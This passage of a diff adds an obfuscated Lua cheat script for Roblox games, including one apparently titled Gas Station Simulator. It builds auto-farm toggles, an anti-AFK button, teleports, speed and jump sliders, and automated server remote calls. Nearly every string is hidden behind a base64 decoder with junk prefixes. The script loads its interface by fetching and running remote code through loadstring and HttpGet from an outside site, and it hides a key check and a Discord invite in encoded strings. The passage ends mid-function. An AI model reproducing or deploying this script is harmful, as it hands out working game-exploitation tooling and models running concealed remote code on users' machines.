+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GmXKfSlqaEyjPBUkZVkplhEiBHuauKLwUmepXocLqqMfnnixOnXTwCaQXV0byBVc2UgM3ggVGFwcyhFdmVyeSAxNSBNaW5zKQ=='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zmPlJwgizGjLnlwAjVTeoLWQspoqmPefXXlCfewISzoJyZgCSexLLxuM3Q='); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().Taps = v
+        Taps()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jjolJiAiwtKHcCpZNvjoVEpWiKgnfzVsumOLuUnqQbJXpSivrpTCUSTQXV0byBDbGFpbSBSYW5rIFJld2FyZHM='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('pJnNuNpancYxSwHHFeIrEVUAVqFguWJqvPTAPXoLYWcGbqdGkQyGwYccmFuaw=='); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().autoRank = v
+        autoRank()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('qPdpWtQxhjMFpyMKTsslILodPnWVkRrQTILgkcJrDQKAKKlNWucKocdQXV0byBDbGFpbSBSYW5kb20gUmV3YXJkcw=='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('TPwYXonjaFyWjNBvyFaCRFrVqSipeRjQfkdUQrgZerhDKSnlphridFqcmFuZG9t'); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().autoClaimRandom = v
+        autoClaimRandom()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('lDmDMqHWyiQvrnZuEifdIRAypzwcorpPgCfblaTQaqwznrLHjBkYwoAT3BlbiBUcmF2ZWxpbmcgTWVyY2hhbnQgR1VJ'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MCKqudKCJIexOsGsWmhwQizduDdeJvQGrMztEBnSVhxZZyxMBSQqwdWcmFuZG9t'); 
+    Default = false; 
+    Callback = function(v) 
+        game.Players.localPlayer.PlayerGui.UI.ExoticShop.Visible = v
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KyyiQgqxRvbFypjdgIZIRXGTYTNFIqpQTbYnNdtEFWjEhusEWUlycTdT3BlbiBNYWdtYSBGb3JnZSBHVUk='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EZNtyoClHajfzWlmNMQQYyxeRCvwYnHNgRLoMOtnFdCdGQectZOdMjFcmFuZG9t'); 
+    Default = false; 
+    Callback = function(v) 
+        game.Players.localPlayer.PlayerGui.UI.MagmaForge.Visible = v
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mwhnlbUCSeVJsrsXanhAxpWNWfPuhxjtmihRRIMSduMvsYeKySZeueET3BlbiBFbmNoYW50bWVudCBHVUk='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ovBgxYBJIUBOQRgTCrmUqmBpYCUfIcFAEYonKmbCPlRfKQkXVRfYfFOcmFuZG9t'); 
+    Default = false; 
+    Callback = function(v) 
+        game.Players.localPlayer.PlayerGui.UI.Enchantment.Visible = v
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ObAXIVUiXVnfGKlUqwvqpCrSLjgDcfFkOMEFODySMptSciRVChxRIsGT3BlbiBQZXQgSW5kZXggR1VJ'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('bBAZuzcobayMaotNaQrKdPuqjQFBTvfZqGlGUnvlCeCebYbLDEPPSPhcmFuZG9t'); 
+    Default = false; 
+    Callback = function(v) 
+        game.Players.localPlayer.PlayerGui.UI.PetIndex.Visible = v
+    end;
+})
+
+Eggs:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YtkLcLLkgSkFdVchGvDmmvxbcGsRwGsTvBNuSLpsfLdQdiQXGhuxkusQXV0b0hhdGNo'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KtKZbFcBaWdmqDqZabXDwYWCccLpMtIRGOFZfAaQDnMlwCsNkrGjIyBRWdn'); 
+    Default = false; 
+    Callback = function(v) 
+        getgenv().autoEgg = v
+        autoEgg()
+    end;
+})
+
+--> BUTTONS <--
+Misc:CreateButton({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('wqmobUcTFesUVstwwsbddVlnNBdCWmdZpgCVPOJdLcJOqcwaKrRxOtMQW50aSBBZms='); 
+    Callback = function() 
+        local L_83_ = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YlFeoFmKpZZypZczSASNkCCKTTMegMZxtnsxZaBeLfppXtmhfKgKUmjVmlydHVhbFVzZXI='))
+        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OzfYzxAHkRkOTNrgnCIVHxkMqzAGekfLvgrNRLmkrJcQlqFSeXUMCylUGxheWVycw==')).Idled:connect(function()
+            warn(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nEyWYrDiOVVEBjiZVobQudjCoaHBWleexKimLSXGaBqENTGlPZSlwIUYW50aS1hZms='))
+            L_83_:CaptureController()
+            L_83_:ClickButton2(Vector2.new())
+        end)
+    end
+})
+
+--> DROPDOWNS <--
+local Teleports = Teleport:CreateDropdown({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('hwNXsKaKJlizMTbdYaQgprwekoUWLRWrvYWVuLYDJTQzzYIYFioOVTiU2VsZWN0IFRlbGVwb3J0');
+    Callback = function(Value) 
+        getgenv().selectRebirth = Value
+        if Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XyUAemhgIIOHfbdtzQWbjlnAcicYPbqhbLITCtbnORVtPwlExXPNKdDU3Bhd24gQXJlYQ==') then
+          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-84.6454, 16.5506, -481.442)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UyAvvuBKraEXiSrrUkSpZdLYWGZZiAiNUnzOcmlbBIxFgyMlulheBOZRm9yZXN0IEFyZWE=') then
+           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-161.951, 977.215, -444.774)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EfsrhDGebiDwHUmxuEzPyiFwXzxYbIVUzkXEcYoiTGtpQAEqGBPenWlRmxvd2VyIEFyZWE=') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-176.474, 1514.45, -648.01)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('nbKDdIGVvZavIXrSzPuCGdKOODUaYJBEutzUiwSFArMvdxBpQuzApRPU3dhbXAgQXJlYQ==') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.011, 2113.39, -656.807)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KnzWxaUWcQWZDCVrhsUCiRbLJiXROehrycMNbfrvVRSnldyFssaHAPPU25vdyBBcmVh') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-241.092, 2934.25, -469.995)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OhhPkpNIzgzFQRqHCrEHXcMCONAzmcSNbVXDJYxeBoIpidCQTUMBvarU2FuZCBBcmVh') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-205.881, 4225.35, -779.94)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('RPpOHbvftLnlNgRquloiKvvyNCaOWafJVTMCtxdUwpKrxEOoKbnJWPbRGVhdGggQXJlYQ==') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-319.197, 5415.49, -480.928)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZImnLtWicvAhIqLTPLnCjmcAamKbbPyrmeKnMGttCPGohCPasWTuJhSQmVhY2ggQXJlYQ==') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-180.304, 6872.29, -495.251)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('JMklBiaBUZVmPCvXNXGzSyPlIuxnYqjzuHNFKrrdtBqBvhYzXbmeuopTWluZXMgQXJlYQ==') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-274.924, 8365.88, -483.89)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mIIxVVCjzCTYWSpwXfPgdZCHHFPIXMGGNmCwkabZENZHvGTGcPAYgMWTWluZXMgQXJlYQ==') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-274.924, 8365.88, -483.89)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('wSxoikqGvQuIEtYfuAdgSPmoHJbqwOXlcNKwvgfnMSnFYkNCECjyXpKQ2xvdWQgQXJlYQ==') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-336.513, 11236.1, -236.306)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OIALcWnOSjflSlivYjTtieTJtKFMWbtJNrFcipjJBbxJKAApRvpPgpAQ29yYWwgQXJlYQ==') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-473.613, 13801.8, -543.772)
+        elseif Value == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cfyGmtZeSXdRtzXNhXkbKiWmMXABmnLRqQRnSyyeyiFQsZCGhEswaFURGFya2hlYXJ0IEFyZWE=') then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-447.291, 17169.8, -552.321)
+    end
+    end;
+    Options = {IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SeENzUniVILPAmkUGcCfxhNmUfBwQggbgCoctRszrQHGCLauSgaXKpjU3Bhd24gQXJlYQ=='), IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XeuLYaxKRzMmdxcDokQJIWnQlXVcYlxYpvkQAwVUAaKUFbFzDlrnaJYRm9yZXN0IEFyZWE='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vDRtFryRvfjVEpjlymRViPvDwaPKdsThhiDYajYqqyuYPLxpGlRkaCaRmxvd2VyIEFyZWE='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jrQkwSOsIRcuuqdwEHRHjXOPHjCZyikbFwamnnWgvZkQVZaWoRIFKgaU3dhbXAgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vceQebfEWvyCPqrRMJuOxfTUJCuUhvPamLdXiNkrqMBcWJdLaiOGsAmU25vdyBBcmVh'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HMbVsuwIqmgEErISCRtkGaqWkRFMZlqCfJsLbUDtRJTqHQvhXOrNJGFU2FuZCBBcmVh'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QILgOkAbywTwrGiLqunNYLtkTdQnALFmvTIIXyjpTyWfagzoEttXsAZRGVhdGggQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cQrVtuLxtDJthngJcjHmNDZZMzKQskAtyCLKYciJKruhzVpnyPGkGsQQmVhY2ggQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mSYPghvwSmlskNuBxJLZIdlJheqFlPpBVKmbJnLpiXEDAqlbSZtMycjTWluZXMgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jiWNgDLujdcLtGYwritimFZsSkvTJyTXLcttyeWWsWZQzRichqTqYFLQ2xvdWQgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zwjuQBHDFFSQgwAliURuChSUyagcjcisQMTRpSpDtQpqPADYbaybYYtQ29yYWwgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('liZrkLkSqGzZVmHtItwbvBNFsflgswcfEiCyYUELkxXLJZzTeJQQmaIRGFya2hlYXJ0IEFyZWE=')};
+    ItemSelecting = true; 
+    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rTTCmPccMrFOaWdNrQbPhrstDRuWKFPuIqWiDsISyQUuQezLUfhBuGuU3Bhd24gQXJlYQ=='); 
+})
+
+local Eggs = Eggs:CreateDropdown({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('bEIhYaWJafnrBDEtbKzcXYBEWjykudLtOcUbrQrtzpGSSymLbellObYU2VsZWN0IEVnZw==');
+    Callback = function(Value) 
+        SelectEgg = Value
+    end;
+    Options = Eggs_Table; 
+    ItemSelecting = true; 
+    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GosQpPcWhYfdpRWctYhdneNiQxdhGmArcrlVrFTADbFESvMTaruZCVhU3RhcnRlcg=='); 
+})
+
+--> SLIDER <--
+Misc:CreateSlider({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZMZeUVMaljtfSSFTlaFtvgnOujEbezeBLzSoTMpTPKzPYsalpsobFaoV2Fsa1NwZWVk'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QDJuvRDYzXHfgNYIvuVgxVVmPwZxtqHXFkZoaGeriGnlGQyTDFBKgkdd3M='); 
+    Min = 16; 
+    Max = 250; 
+    AllowOutOfRange = true;
+    Digits = 2;
+    Default = 16; 
+    Callback = function(v)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
+    end;
+})
+
+Misc:CreateSlider({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tcrFtXbZojkZNwRxclfmhrZLuEurBXDSlKmmYTypGeTxOVKlcGtrZVdSnVtcFBvd2Vy'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xUBSiHtmIcjYyfDlFVmTeZVjYjlBfKhGydFXfPXcbJAUCekqVewyUiianA='); 
+    Min = 50; 
+    Max = 350; 
+    AllowOutOfRange = true;
+    Digits = 2;
+    Default = 50; 
+    Callback = function(v)
+        game.Players.LocalPlayer.Character.Humanoid.JumpHeight = v
+    end;
+})
+
+Misc:CreateSlider({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('smPCYZSKHviSuxEFKnXpfCvTbqisZZRmzYUBQnLhyRSNZnTizVRolcQRk9W'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EZORRBtVLDVbsRmXCxCqCyEnlZzQYotwwEkdYYeLdlCTHcFhZSMisVpRk9W'); 
+    Min = 70; 
+    Max = 120; 
+    AllowOutOfRange = true;
+    Digits = 2;
+    Default = 70; 
+    Callback = function(v)
+        game.Workspace.CurrentCamera.FieldOfView = v
+    end;
+})
+
+elseif game.PlaceId == 9359839118 then
+--> LOADING THE GUI <--
+local Atlas = loadstring(game:HttpGet(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('VMCPhndtRUTlHzlNTCTcRhYOIuREYfnHFotJffhFekXcMlUomHlMMrWaHR0cHM6Ly9yZDJnbG9yeS5jb20vQXRsYXMubHVh')))()
+local UI = Atlas.new({
+        Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vKrxDGaowexrMWXjDjRdLwHfZIjGAODjfiWzipWdiumxsMNLUztszglRGVtaXNlSHViIHwgR2FzIFN0YXRpb24gU2ltdWxhdG9yIA=='); 
+        ConfigFolder = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vNmtlRdMYdQPCthMVsvLtAQEieecEgPtVXYQhuNIiYtjrfssjZgUutsRGVtaXNlSHVi'); 
+        Credit = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('WlUIkbJZHniQbmjFhJyGfjNlhWNHxNCYfilHUYRSdTatdpmweJPtyvQTWFkZSBCeSBwdGgjMDMxNg=='); 
+        Color = Color3.fromRGB(255, 255, 255); 
+        Bind = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YZZXgLFpCXKJICCbBBZlYziFPJgCYzcvRMSwHtAQbYaKeOOvLjaNcDhTGVmdENvbnRyb2w='); 
+        UseLoader = true; 
+        FullName = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FVQtGiDxHflVDzYUhVuEhdsJpNUByrdNxiQfwGKruFVBAOYLhpNHiqiRGVtaXNlSHVi'); 
+        CheckKey = function(inputtedKey) 
+            return inputtedKey==IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LaCOmdobBTJneHiaIjShXAvsQuVYYbLMYdqzPEruwwcDnRmUdFXdhOuRDNtaXNlMG5UMHA=')
+        end;
+        Discord = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('aexKPAXGxjHMzGMxOliFCmGmkbxAVyLfoBkSZfTizeHqmdAomIvKRpraHR0cHM6Ly9kaXNjb3JkLmdnL2ZRdkh4OE1qS1M=');
+    })
+
+--> VALUES <--
+getgenv().AutoWindowsValue = nil
+getgenv().AutoSolarValue = nil
+getgenv().AutoPumpValue = nil
+getgenv().AutoStainsValue = nil
+getgenv().AutoCashierValue = nil
+
+local busy = false
+
+game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DKKMJcePuVTesuBwawGfTfJrbiHMOcxSCZIqHVhnGHalPOkGgQIETWYUGxheWVycw==')).LocalPlayer.PlayerGui.GameUI.Stamina.Bar.Amount.Changed:Connect(function(prop)
+    if prop == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FjWwgQSsmLvyLGFQpIwjOKkdtXmpJiYmtBSNQcismgIPwxYJWmnYtgWVGV4dA==') then
+        stam = tonumber(
+            string.sub(
+                game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jjRsgXzaBzBixQvGLzdyAFnLXGcjQCQVmORatPlstvxYnVlrTUQfsxaUGxheWVycw==')).LocalPlayer.PlayerGui.GameUI.Stamina.Bar.Amount.Text,
+                1,
+                #game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('qiFxxdvPVsUqnNqarakPOiydsSXCDkJIwqslUQRPgAhanoQwmCVvavfUGxheWVycw==')).LocalPlayer.PlayerGui.GameUI.Stamina.Bar.Amount.Text - 1
+            )
+        )
+        if stam <= 15 then
+            UI:Notify({
+                Title = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('CpGVeOlzeqeBLDQRPFuVJaDZginGfwWEWrYsviOzVcMPwMHIKKpGkCPRW5lcmd5');
+                Content = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sWqzFfBXfYSohYYXwGFZhRgWiUILqZizzkEHcRgYelUMjLrcEUjqMWjWW91ciBlbmVyZ3kgaXMgYXQg') .. tostring(stam) .. IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tZcMjrWmLXeMnLvGqEEPgqNmeHyJMlxlZjgakbxRkPCaXyGbqQLpXeaJQ=='),
+              })
+            end
+        end
+    end)
+
+    print(stam)
+    
+    function AutoPump()
+        task.spawn(function()
+            while getgenv().AutoPumpValue do
+            break
+                end
+                for i, car in pairs(game.Workspace:GetChildren()) do
+                    if string.find(car.Name, IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KAGJwketxqwQISNknnhkMyeJgpCCAuHwVjqoDFDBtKGxBkNYZxfePXEQ2FyXw==')) then
+                        if string.find(car.Name, IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('iZDHczncIRWKZANnHXXWTRhKWnHGRAbchCsMGhQrRiTlqJQYvcCcEYaQ2FyX0J1cw==')) then
+                            continue
+                        end
+                        local root = car:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZxGHJxrMpCrcKAuojiMkQylAkIFXcWLPzxScigRFJmsjFQuxArdDjqxUm9vdA=='))
+                        if root then
+                            local pump = root:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('burvxInioTDviaNXMoyROnYgAeKWjgJodPabvKhBEVrJUGrPEFpNudrUHVtcA=='))
+                            local lid = car:WaitForChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sJBPncAHaPLZKfwlqGFJGjYQCQTbSoUKUMRRpDswLoeOpIwxHIPHXveTGlk'))
+                            local fuel = lid:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('WMqfOUIcxkdttZUyFjIGRgJSEWuHOvZKbsdNciurdmqTXgYODXAVCQeUmVmdWVs'))
+                            local finishFuel = lid:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FBwYHMcrUFIMfzIcMAtnUwKrzJCcoQVkNKJCcHACyHmLGnNvwPeoXorRmluaXNoRnVlbA=='))
+                            if pump and pump.Value ~= nil then
+                                local fuelgui = pump.Value:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cEQJUVxokNZjyvxwPtuPmwQxGviNZwGxownSqwFdkbTyohErcwqAbcqU2NyZWVu')).FuelUI
+    
+                                local fuelneeded = 0
+                                if fuel then
+                                    local splits = string.split(fuel.ObjectText, IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('CbTzPwDBmNItBDgYXTfEcQZhgELTFUMGMcGOWVlZRAjQCLIVnuPZsccIA=='))
+    
+                                    fuelneeded = tonumber(string.sub(splits[2], 1, #splits[2] - 1))
+                                end
+                                local totalFuel = tonumber(string.sub(fuelgui.Storage.Text, 1, #fuelgui.Storage.Text - 1))
+                                if fuelneeded > 0 then
+                                    print(fuelneeded)
+                                end
+    
+                                if fuel and totalFuel > fuelneeded and totalFuel > 0 and not busy then
+                                    busy = true
+                                    local args = {
+                                        [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZtbIbbFAvwZsuzxlKjNsmDiUagPdYOtnevcKdrenAPKyxcxscfzQdklRnVlbEN1c3RvbWVy'),
+                                        [2] = car,
+                                        [3] = pump.Value,
+                                    }
+    
+                                    game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('oqXSbSuAyUFmhDPcfxaSbTKKIMZhqGPMaSheSlnKMTlJTeaYBTmmVqAUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
+                                    task.wait(1.5)
+                                    busy = false
+                                end
+                                if finishFuel and not busy then
+                                    busy = true
+                                    local args = {
+                                        [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DcmxhLosoqUunQPaEoWvJDOlQyidAZfNUhMuxNvChmtCrUQoufNSiqxRmluaXNoRnVlbA=='),
+                                        [2] = car,
+                                        [3] = pump.Value,
+                                    }
+    
+                                    game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vxqvInLPWeZvmCgKoYEetGrNXKMCftcKVCsTXWFqVrKkhERHdgZNsxQUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
+                                    task.wait(0.5)
+                                    busy = false
+                                end
+                            end
+                        end
+                    end
+                end
+    
+            task.wait()
+        end)
+    end
+    
+    function AutoSolar()
+        task.spawn(function()
+            while getgenv().AutoSolarValue do
+                if not getgenv().AutoSolarValue or stam <= 15 then
+                    break
+                end
+                for i, panel in pairs(workspace.Solar.Panels:GetChildren()) do
+                    local dirt = panel.Dirt
+    
+                    if dirt.Transparency < 1 and not busy then
+                        busy = true
+                        local args = {
+                            [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ieztbWuRUNcnVDaCSUzThxtCgHNwfCYJPvuJNNXDdkrGUUXMHuUODGbQ2xlYW4='),
+                            [2] = workspace.Solar.Panels[panel.Name].Stand.CleanPosition.Clean,
+                        }
+                        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('iUnVRmxMafPvVBYcOkgqnHGkesSqOkLYYptTLgZikgETfuxIYmXJwjgUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
+                        task.wait(1.5)
+                        busy = false
+                    end
+                end
+                task.wait()
+            end
+        end)
+    end
+    
+    function AutoWindows()
+        task.spawn(function()
+            while getgenv().AutoWindowsValue do
+                for i, v in pairs(game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QaytCGjicVQJuBHXqFAqAkYORvlGrYegZUBPvztDkwKxxkglVhuNfLSV29ya3NwYWNl')).Windows:GetChildren()) do
+                    local sand = v:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('bopBXcXmrauRilMzDfurtodDHIEnmOvMPjMmJWJddABwDFZJNEDNYSiU2FuZA=='))
+    
+                    if sand.Transparency < 1 and not busy then
+                        busy = true
+                        local args = {
